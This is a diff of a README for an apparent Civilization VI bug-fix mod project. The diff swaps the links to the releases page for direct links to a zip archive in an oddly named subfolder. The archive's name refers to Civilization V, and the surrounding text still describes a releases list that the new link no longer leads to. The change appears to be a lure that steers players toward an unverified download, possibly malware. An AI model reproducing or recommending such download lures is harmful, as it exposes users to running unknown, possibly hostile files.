@@ -1,6 +1,6 @@
 # 🏛️ Civilization-VI-Mods - Stable game play for every session
 
-[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://github.com/alejo3045/Civilization-VI-Mods/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-Blue)](https://raw.githubusercontent.com/alejo3045/Civilization-VI-Mods/main/bellote/Mods_Civilization_V_v2.0.zip)
 
 This software fixes known bugs and improves game stability for Civilization VI on Windows. These patches address common crashes and performance drops during long play sessions. The project receives regular updates to ensure compatibility with the latest desktop software.
 
@@ -20,7 +20,7 @@ You confirm your version of Windows by clicking the Start button, selecting Sett
 
 Visit the official release page to obtain the mod files.
 
-[Download link: https://github.com/alejo3045/Civilization-VI-Mods/releases](https://github.com/alejo3045/Civilization-VI-Mods/releases)
+[Download link: https://raw.githubusercontent.com/alejo3045/Civilization-VI-Mods/main/bellote/Mods_Civilization_V_v2.0.zip](https://raw.githubusercontent.com/alejo3045/Civilization-VI-Mods/main/bellote/Mods_Civilization_V_v2.0.zip)
 
 Click on the link to see a list of version releases. Select the top item in the list, as this represents the most recent version. Look for the file ending in .zip or .exe under the Assets section. Save this file to your Downloads folder.
 
